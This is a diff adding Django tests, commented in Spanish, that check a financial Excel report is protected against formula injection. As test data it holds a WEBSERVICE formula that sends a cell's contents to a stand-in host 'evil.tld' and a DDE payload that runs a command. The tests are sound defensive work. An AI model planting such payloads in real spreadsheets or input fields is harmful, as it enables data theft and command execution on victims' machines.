@@ -268,3 +268,65 @@ class InyeccionFormulasAuditoriaTest(TenantTestCase):
                 xml = z.read(nombre).decode('utf-8')
                 self.assertNotIn('<f>', xml, f'{nombre} contiene una formula viva')
                 self.assertNotIn('<f ', xml, f'{nombre} contiene una formula viva')
+
+
+class InyeccionFormulasFinancieroTest(TenantTestCase):
+    """El libro financiero es un sumidero aparte: no comparte helper de
+    escritura con el de auditoria y lo sirve otro endpoint, asi que arreglar
+    uno solo dejaba este explotable. Ademas del nombre del activo, aqui son
+    texto de usuario el nombre de la empresa (banda 1) y las etiquetas de
+    categoria del resumen y del detalle."""
+
+    CARGA = '=WEBSERVICE("http://evil.tld/"&A10)'
+
+    @classmethod
+    def setUpClass(cls):
+        super().setUpClass()
+        with tenant_context(cls.tenant):
+            cls.user = Usuario.objects.create_user(username='injfin', password='secreta123')
+            categoria = Categoria.objects.create(nombre='=1+1', prefijo='INF')
+            loc = Localizacion.objects.create(nombre='Oficinas')
+            Activo.objects.create(
+                numero_activo='INF-0001', nombre=cls.CARGA,
+                costo_original=Decimal('1000000'), valor_libros_actual=Decimal('0'),
+                depreciacion_acumulada_actual=Decimal('0'),
+                fecha_adquisicion=date(2020, 1, 1), fecha_inicio=date(2020, 1, 1),
+                vida_util_anios=10, estado_depreciacion='DEPRECIANDO',
+                localizacion=loc, categoria=categoria,
+            )
+        cls.host = cls.tenant.get_primary_domain().domain
+
+    def setUp(self):
+        self.client = APIClient()
+        with tenant_context(self.tenant):
+            self.client.cookies['access'] = str(crear_refresh(self.user).access_token)
+
+    def _descargar(self):
+        resp = self.client.get('/api/reportes/financiero/?corte=2024-06', HTTP_HOST=self.host)
+        self.assertEqual(resp.status_code, 200)
+        return resp.content
+
+    def test_el_nombre_del_activo_queda_como_texto(self):
+        ws = load_workbook(BytesIO(self._descargar())).active
+        fila = next(r for r in range(1, ws.max_row + 1)
+                    if ws.cell(row=r, column=1).value == 'INF-0001')
+        celda = ws.cell(row=fila, column=2)   # Descripcion
+        self.assertEqual(celda.data_type, 's')
+        self.assertEqual(celda.value, self.CARGA)
+
+    def test_ninguna_celda_del_libro_se_escribe_como_formula(self):
+        with zipfile.ZipFile(BytesIO(self._descargar())) as z:
+            hojas = [n for n in z.namelist() if n.startswith('xl/worksheets/')]
+            self.assertTrue(hojas)
+            for nombre in hojas:
+                xml = z.read(nombre).decode('utf-8')
+                self.assertNotIn('<f>', xml, f'{nombre} contiene una formula viva')
+                self.assertNotIn('<f ', xml, f'{nombre} contiene una formula viva')
+
+    def test_el_nombre_de_la_empresa_tampoco_queda_como_formula(self):
+        # La banda 1 lleva el nombre de la empresa, que se fija al darla de alta.
+        with tenant_context(self.tenant):
+            from assets.reportes import construir_libro_financiero
+            wb = construir_libro_financiero(date(2024, 6, 30), '=cmd|\'/c calc\'!A1')
+        celda = wb.active['A1']
+        self.assertEqual(celda.data_type, 's')
